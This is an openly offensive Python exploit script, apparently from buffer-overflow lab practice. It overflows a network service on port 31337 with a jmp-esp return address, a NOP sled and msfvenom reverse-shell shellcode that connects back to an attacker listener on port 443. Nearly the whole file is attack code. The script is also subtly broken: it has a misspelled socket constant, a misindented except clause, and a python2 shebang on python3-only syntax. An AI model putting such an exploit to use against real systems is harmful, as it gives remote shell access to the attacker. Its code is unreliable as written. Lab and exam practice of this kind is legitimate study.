#!/usr/bin/env python2
import socket

RHOST = "192.168.56.1"
RPORT = 31337

offset = 146

overflow = b'A' * offset
retn = b'\xC3\x14\x04\x08'  # jmp_esp 0x080414c3
padding = b'\x90' * 20

#badchars \x00\x0a
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.106 LPORT=443 -b "\x00\x0a" -f python
shellcode = b'\xda\xcb\xd9\x74\x24\xf4\x5b\x2b\xc9\xba\x26\x02\x29\x1b\xb1\x52\x31\x53\x17\x83\xc3\x04\x03\x75\x11\xcb\xee\x85\xfd\x89\x11\x75\xfe\xed\x98\x90\xcf\x2d\xfe\xd1\x60\x9e\x74\xb7\x8c\x55\xd8\x23\x06\x1b\xf5\x44\xaf\x96\x23\x6b\x30\x8a\x10\xea\xb2\xd1\x44\xcc\x8b\x19\x99\x0d\xcb\x44\x50\x5f\x84\x03\xc7\x4f\xa1\x5e\xd4\xe4\xf9\x4f\x5c\x19\x49\x71\x4d\x8c\xc1\x28\x4d\x2f\x05\x41\xc4\x37\x4a\x6c\x9e\xcc\xb8\x1a\x21\x04\xf1\xe3\x8e\x69\x3d\x16\xce\xae\xfa\xc9\xa5\xc6\xf8\x74\xbe\x1d\x82\xa2\x4b\x85\x24\x20\xeb\x61\xd4\xe5\x6a\xe2\xda\x42\xf8\xac\xfe\x55\x2d\xc7\xfb\xde\xd0\x07\x8a\xa5\xf6\x83\xd6\x7e\x96\x92\xb2\xd1\xa7\xc4\x1c\x8d\x0d\x8f\xb1\xda\x3f\xd2\xdd\x2f\x72\xec\x1d\x38\x05\x9f\x2f\xe7\xbd\x37\x1c\x60\x18\xc0\x63\x5b\xdc\x5e\x9a\x64\x1d\x77\x59\x30\x4d\xef\x48\x39\x06\xef\x75\xec\x89\xbf\xd9\x5f\x6a\x6f\x9a\x0f\x02\x65\x15\x6f\x32\x86\xff\x18\xd9\x7d\x68\xe7\xb6\x45\x02\x8f\xc4\xb5\xd3\xf4\x40\x53\xb9\x1a\x05\xcc\x56\x82\x0c\x86\xc7\x4b\x9b\xe3\xc8\xc0\x28\x14\x86\x20\x44\x06\x7f\xc1\x13\x74\xd6\xde\x89\x10\xb4\x4d\x56\xe0\xb3\x6d\xc1\xb7\x94\x40\x18\x5d\x09\xfa\xb2\x43\xd0\x9a\xfd\xc7\x0f\x5f\x03\xc6\xc2\xdb\x27\xd8\x1a\xe3\x63\x8c\xf2\xb2\x3d\x7a\xb5\x6c\x8c\xd4\x6f\xc2\x46\xb0\xf6\x28\x59\xc6\xf6\x64\x2f\x26\x46\xd1\x76\x59\x67\xb5\x7e\x22\x95\x25\x80\xf9\x1d\x55\xcb\xa3\x34\xfe\x92\x36\x05\x63\x25\xed\x4a\x9a\xa6\x07\x33\x59\xb6\x62\x36\x25\x70\x9f\x4a\x36\x15\x9f\xf9\x37\x3c'+ b'\n'

payload = overflow + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INEt, socket.SOCK_STREAM) as s:
        s.settimeout(3)
        s.connect((RHOST, RPORT))
        print('[+] Sending evil buffer...')
        s.send(payload)
        # print out what we sent
        print("[+] Sent: {0}".format(payload))
    except:
        print('Could not connect to remote host')